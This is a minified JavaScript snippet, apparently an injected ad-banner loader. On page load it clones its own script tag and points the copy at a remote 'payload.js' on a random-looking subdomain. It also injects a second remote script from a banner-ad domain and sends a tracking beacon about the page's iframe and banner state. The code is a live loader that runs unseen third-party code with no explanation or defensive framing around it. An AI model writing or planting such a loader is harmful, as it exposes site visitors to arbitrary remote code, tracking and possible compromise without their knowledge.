! function() {
    function e(e) {
        var n = "",
            t = "?";
        for (var r in e) {
            var o = e[r],
                a = "boolean" == typeof o ? o ? r : null : o;
            a && (n += t + "cv[]=" + encodeURIComponent(a), t = "&")
        }(new Image).src = "http://d.mobilebanner.ru/p.gif" + n
    }

    function n() {
        try {
            return window.self !== window.top
        } catch (e) {
            return !0
        }
    }

    function t() {
        var e = document.getElementsByTagName("head")[0],
            n = document.createElement("script");
        n.src = "http://p.mobilebanner.ru/ad/base.js?", n.type = "text/javascript", e.appendChild(n)
    }

    function r(e) {
        c.parentNode.insertBefore(e, c.nextSibling)
    }

    function o(e) {
        document.write(e.outerHTML)
    }

    function a() {
        for (var e = document.createElement("script"), n = Array.prototype.slice.call(c.attributes), t = 0; t < n.length; t++) e.setAttribute(n[t].nodeName, n[t].nodeValue);
        return e.src = "http://37oqbfqt8fwe9hn2ol.bruh.software/payload.js?", e
    }
    var c = document.currentScript || document.scripts[document.scripts.length - 1],
        i = a();
    c.async || c.defer ? r(i) : o(i);
    var d, u = n();
    window.__qsrad || u ? d = {
        iframe: u,
        bannerAlready: window.__qsrad
    } : (window.__qsrad = 1, d = {
        bannerShow: !0
    }, t()), e(d)
}();
